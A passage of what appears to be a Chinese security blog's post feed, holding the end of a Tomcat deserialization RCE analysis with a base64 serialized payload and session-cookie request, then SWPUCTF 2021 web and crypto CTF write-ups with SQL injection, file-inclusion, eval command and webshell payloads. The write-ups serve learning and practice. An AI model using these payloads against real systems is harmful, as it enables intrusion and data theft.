class="number">8</span>APwASAEIAEABDABEARwATABUAAAAqAAQAIQADABkAGgABAEMABAAbABwAAgADAEQAHQAeAAAANwAQABkAGgABAB<span class="number">8</span>AAAAVAAT<span class="number">8</span>ACQHACD<span class="number">8</span>ABIHACFKBwAi+QAEAAEAIwAAAAIAJHVxAH<span class="number">4</span>ADgAAAPLK/rq+AAAAMQATAQADRm<span class="number">9</span>vBwABAQAQamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">09</span>iamVjdAcAAwEAClNvdXJjZUZpbGUBAAhGb<span class="number">28</span>uamF<span class="number">2</span>YQEAFGphdmEvaW<span class="number">8</span>vU<span class="number">2</span>VyaWFsaXphYmxlBwAHAQAQc<span class="number">2</span>VyaWFsVmVyc<span class="number">2</span>lvblVJRAEAAUoFceZp<span class="number">7</span>jxtRxgBAA<span class="number">1</span>Db<span class="number">25</span>zdGFudFZhbHVlAQAGPGluaXQ+AQADKClWDAAOAA<span class="number">8</span>KAAQAEAEABENvZGUAIQACAAQAAQAIAAEAGgAJAAoAAQANAAAAAgALAAEAAQAOAA<span class="number">8</span>AAQASAAAAEQABAAEAAAAFKrcAEbEAAAAAAAEABQAAAAIABnB<span class="number">0</span>AALBkHB<span class="number">3</span>AQB<span class="number">4</span>c<span class="number">3</span>IAVMGvwbLBp<span class="number">8</span>CuwaHBsMGhwaPBqMGlwK<span class="number">7</span>Bo<span class="number">8</span>Gvwa<span class="number">3</span>BrcGvwa<span class="number">7</span>Bs<span class="number">8</span>CuwaPBr<span class="number">8</span>GswazBpcGjwbTBqcGvwa<span class="number">7</span>Bs<span class="number">8</span>Cuwa<span class="number">3</span>BocGwwK<span class="number">7</span>BjMGhwbrBucGNwaHBsG<span class="number">7</span>llIKeeRCUAwABTAAOwabBocGjwbTBr<span class="number">8</span>Gywbl<span class="number">0</span>AFjBjMGvwbLBp<span class="number">8</span>CvwaHBsMGhwaPBqMGlwK/Bo<span class="number">8</span>Gvwa<span class="number">3</span>BrcGvwa<span class="number">7</span>Bs<span class="number">8</span>CvwaPBr<span class="number">8</span>GswazBpcGjwbTBqcGvwa<span class="number">7</span>Bs<span class="number">8</span>CvwZTBssGhwa<span class="number">7</span>Bs<span class="number">8</span>Gmwa/BssGtwaXBssC<span class="number">7</span>eHBzcgB<span class="number">0</span>wa/BssGnwK<span class="number">7</span>BocGwwaHBo<span class="number">8</span>GowaXArsGjwa/BrcGtwa/BrsGzwK<span class="number">7</span>Bo<span class="number">8</span>GvwazBrMGlwaPBtMGpwa/BrsGzwK<span class="number">7</span>BpsG<span class="number">1</span>wa<span class="number">7</span>Bo<span class="number">8</span>G<span class="number">0</span>wa/BssGzwK<span class="number">7</span>BicGuwbbBr<span class="number">8</span>GrwaXBssGUwbLBocGuwbPBpsGvwbLBrcGlwbKH<span class="number">6</span>P<span class="number">9</span>re<span class="number">3</span>zOOAIAA<span class="number">1</span>sACsGpwYHBssGnwbN<span class="number">0</span>ACbBm<span class="number">8</span>GMwarBocG<span class="number">2</span>waHAr<span class="number">8</span>GswaHBrsGnwK/Bj<span class="number">8</span>GiwarBpcGjwbTAu<span class="number">0</span>wAFsGpwY<span class="number">3</span>BpcG<span class="number">0</span>wajBr<span class="number">8</span>GkwY<span class="number">7</span>BocGtwaVxAH<span class="number">4</span>ACVsAFsGpwZDBocGywaHBrcGUwbnBsMGlwbNxAH<span class="number">4</span>ACHhwdXIAJsGbwYzBqsGhwbbBocCuwazBocGuwafArsGPwaLBqsGlwaPBtMC<span class="number">7</span>kM<span class="number">5</span>YnxBzKWwCAAB<span class="number">4</span>cAAAAAB<span class="number">0</span>ABzBrsGlwbfBlMGywaHBrsGzwabBr<span class="number">8</span>Gywa<span class="number">3</span>BpcGydXIAJMGbwYzBqsGhwbbBocCuwazBocGuwafArsGDwazBocGzwbPAu<span class="number">6</span>sW<span class="number">167</span>LzVqZAgAAeHAAAAAAc<span class="number">3</span>EAfgAAP<span class="number">0</span>AAAAAAAAx<span class="number">3</span>CAAAABAAAAAAeHh<span class="number">0</span>AALBtHg=)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>之后构造第二个数据包</p><p>第二个数据包内容如下：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.218.80:8080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.xxxxx</span><br></pre></td></tr></table></figure><p>之后发包</p><p>由于我的漏洞环境是在WSL+Ubuntu-22.04环境下，无法直接calc，于是笔者换了另一种方式（touch &#x2F;tmp&#x2F;poc_success以创建标记文件） 同时也成功观察到标记文件生成，证明漏洞利用成功</p><p><img src="/images/cve-tomcat-rce-exp.png" alt="该图展示了更改所执行命令并生成新的payload"></p><p>先后发送两个数据包</p><p><img src="/images/cve-tomcat-rce-7.png" alt="图七展示了观察到标记文件以证明成功利用了漏洞"></p>]]></content>
      
      
      <categories>
          
          <category> vuln analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuln analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF2021新生赛Web刷题记录</title>
      <link href="/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h2><p>Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可</p><h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，以post方式传<code>id=wllmNB</code>和以get方式传<code>json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code>即可</p><h2 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">wrong!</span><br></pre></td></tr></table></figure><p>要求：<code>name</code>的值不等于<code>password</code>的值且其md5后相等</p><p>两种方法：</p><h4 id="1-数组漏洞绕过"><a href="#1-数组漏洞绕过" class="headerlink" title="1.数组漏洞绕过"></a>1.数组漏洞绕过</h4><p><img src="/images/SWPUCTF-Web-2.png" alt="图一展示了利用数组漏洞以进行绕过"></p><p>原理：PHP md5函数接收的参数为string（字符串型），如果传入arry（数组型）就无法计算其md5值，但不会报错，导致数组md5值都相等</p><h4 id="2-PHP弱比较"><a href="#2-PHP弱比较" class="headerlink" title="2.PHP弱比较"></a>2.PHP弱比较</h4><p><img src="/images/SWPUCTF-Web-3.png" alt="图二展示了利用PHP弱比较以进行绕过"></p><p>原理：PHP在进行“&#x3D;&#x3D;”（弱类型比较）时，会先转换字符串类型，再进行字符串比较，而进行md5后以0e开头的都会被PHP识别为科学计数法，即<code>0e*</code>被视作0的<code>*</code>次方，结果都为0，故我们只需找到md5后为<code>0e*</code>的字符串，常用md5后为<code>0e*</code>的有：</p><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">字符串         对应md5值</span><br><span class="line"></span><br><span class="line"><span class="number">240610708</span>      <span class="number">0</span>e4620974319065090195<span class="number">62988736854</span></span><br><span class="line"></span><br><span class="line">QLTHNDT       <span class="number">0</span>e40596782540195537<span class="number">2549139051580</span></span><br><span class="line"></span><br><span class="line">QNKCDZO      <span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"></span><br><span class="line">PJNPDWY       <span class="number">0</span>e2915290528947027745<span class="number">57631701704</span></span><br><span class="line"></span><br><span class="line">NWWKITQ      <span class="number">0</span>e7630820709760383476<span class="number">57360817689</span></span><br><span class="line"></span><br><span class="line">NOOPCJF       <span class="number">0</span>e818888003657176127<span class="number">862245791911</span></span><br><span class="line"></span><br><span class="line">MMHUWUV    <span class="number">0</span>e701732711630150438<span class="number">129209816536</span></span><br><span class="line"></span><br><span class="line">MAUXXQC     <span class="number">0</span>e4784784668484390404<span class="number">34801845361</span></span><br></pre></td></tr></table></figure><p>注：以上字符串要记得两个及两个以上，对应md5值不用记</p><h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="/images/SWPUCTF-Web-4.png" alt="图三展示了题目中给的提示和一个很大只的杰哥"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-sql-2.png" alt="图四展示了开始猜字段"></p><h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure><h4 id="判断出字段数为3"><a href="#判断出字段数为3" class="headerlink" title="判断出字段数为3"></a>判断出字段数为3</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure><h4 id="查看回显点"><a href="#查看回显点" class="headerlink" title="查看回显点"></a>查看回显点</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><h4 id="查看数据库信息"><a href="#查看数据库信息" class="headerlink" title="查看数据库信息"></a>查看数据库信息</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, @@version --+</span></span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-sql-3.png" alt="图五展示了通过sql注入查看数据库信息"></p><p>MariaDB数据库管理系统是MySQL的一个分支，说明需要使用mysql语句注入</p><h4 id="查询库名和用户名"><a href="#查询库名和用户名" class="headerlink" title="查询库名和用户名"></a>查询库名和用户名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, database() --+</span></span><br></pre></td></tr></table></figure><h4 id="可知，当前数据库名为test-db"><a href="#可知，当前数据库名为test-db" class="headerlink" title="可知，当前数据库名为test_db"></a>可知，当前数据库名为test_db</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, user() --+</span></span><br></pre></td></tr></table></figure><h4 id="得知目前用户是root-可以查看任意数据库信息"><a href="#得知目前用户是root-可以查看任意数据库信息" class="headerlink" title="得知目前用户是root 可以查看任意数据库信息"></a>得知目前用户是<code>root</code> 可以查看任意数据库信息</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p>发现有两个表，test_tb和users</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>发现有<code>flag</code>表</p><h4 id="查看flag表内容"><a href="#查看flag表内容" class="headerlink" title="查看flag表内容"></a>查看<code>flag</code>表内容</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2, group_concat(flag) from test_tb --+</span></span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-sql-4.png" alt="成功拿到flag"></p><h2 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h2><p><img src="/images/SWPUCTF-Web-include-1.png" alt="题目详情"></p><p>用<code>Hackbar</code>传入一个<code>file</code>试试</p><p><img src="/images/SWPUCTF-Web-include-2.png" alt="图二展示了利用Hackbar传入一个名为file值为1的参数后页面回显"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure><p>分析脚本发现其中开了远程包含，说明我们可以用文件包含(远程包含)去做这道题，我们通过PHP伪协议来远程包含并读取<code>flag.php</code>文件</p><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取</p><p>For example:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p>通俗来讲，convert.base64-encode是一种过滤器，read是用来指定读取的文章内容利用管道符，来进行条件的再筛选，后面要进行base64-encode以解码</p><p>构造以下payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-include-3.png" alt="图三展示了利用php伪协议以读取flag.php文件"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&#x27;NSSCTF&#123;e8c19d3d-d948-4e0b-8d6d-1fbf35fd3ba2&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-easyrce-1.png"></p><p>替换成：</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">/?url=<span class="keyword">system</span>(<span class="string">&quot;cat /flllllaaaaaaggggggg&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-easyrce-2.png"></p><h2 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h2><p>直接AntSword连接后在根目录下找到flag</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">68</span>bb6079-<span class="number">56</span>dc-<span class="number">4</span>f7a-ba1e-<span class="number">96</span>afcdca7b1a&#125;</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><p>抓包后将<code>User-Agent</code>改成<code>WLLM</code></p><p><img src="/images/SWPUCTF-http-1.png"></p><p><img src="/images/SWPUCTF-http-2.png"></p><p>发现这里是有一个文件的，还给了提示”智能用本地ip访问”</p><p>直接用XFF(X-Forwarded-For)</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /./a.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node7.anna.nssctf.cn:<span class="number">28524</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-US</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: WLLM</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">X</span>-Forwarded-For:<span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/images/SWPUCTF-Web-http-3.png"></p><p>在MITM交互式劫持页面选择放行（我们上面构造的数据包）</p><p><img src="/images/SWPUCTF-Web-http-3.png"></p><p>成功拿到flag</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;ee2756e8-a41c-<span class="number">4</span>d15-<span class="number">8</span>bd9-<span class="number">0</span>f50a445919d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Crypto-babyFibo</title>
      <link href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-babyFibo/"/>
      <url>/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-babyFibo/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>附件内容：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">assert</span> n &gt;= <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fibo(n-<span class="number">1</span>) + fibo(n-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = fibo(<span class="number">1000</span>)</span><br><span class="line">m = libnum.s2n(flag+os.urandom((<span class="built_in">len</span>(<span class="built_in">bin</span>(s))-<span class="number">2</span>)//<span class="number">8</span>-<span class="built_in">len</span>(flag)))</span><br><span class="line">c = m^s</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>s是斐波那契数的第1000个数</li><li>m&#x3D;flag+随机数字然后再(String to Number)转为一个超大数字</li><li>c&#x3D;m^s</li></ul><p>那解题思路就是将其中设计的步骤反着来一遍</p><h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><h3 id="计算fibo-1000"><a href="#计算fibo-1000" class="headerlink" title="计算fibo(1000)"></a>计算fibo(1000)</h3><p>以下由三种方法计算fibo(1000) </p><p>由于直接递归1000不可行</p><h4 id="方法一：动态规划："><a href="#方法一：动态规划：" class="headerlink" title="方法一：动态规划："></a>方法一：动态规划：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibo</span>(<span class="params">n</span>):</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">s = fibo(<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h4 id="方法二：直接调用库函数"><a href="#方法二：直接调用库函数" class="headerlink" title="方法二：直接调用库函数"></a><strong>方法二：直接调用库函数</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">s = gmpy2.fib(<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Input should be a positive integer.&quot;</span></span><br><span class="line">    fib_seq = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(fib_seq) &lt; n:</span><br><span class="line">        fib_seq.append(fib_seq[-<span class="number">1</span>] + fib_seq[-<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> fib_seq[n - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是附件中给的字符串</span></span><br><span class="line">c = <span class="number">43104378128345818181217961835377190975779804452524643191544804229536124095677294719566215359919831933542699064892141754715180028183150724886016542388159082125737677224886528142312511700711365919689756090950704</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Compute the 1001st Fibonacci number</span></span><br><span class="line">s = fibonacci(<span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR the ciphertext with the Fibonacci number to get the message</span></span><br><span class="line">m = c ^ s</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the message to a string</span></span><br><span class="line">b = libnum.n2s(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><script src="https://giscus.app/client.js"        data-repo="fishcanf1y/fishcanf1y.github.io"        data-repo-id="R_kgDONzaTTQ"        data-category="Announcements"        data-category-id="DIC_kwDONzaTTc4Cpqn7"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="top"        data-theme="preferred_color_scheme"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Crypto-初识RSA</title>
      <link href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E5%88%9D%E8%AF%86RSA/"/>
      <url>/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E5%88%9D%E8%AF%86RSA/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>附件内容：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,inverse,getPrime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">pq = p*(q-<span class="number">1</span>)</span><br><span class="line">qp = q*(p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span 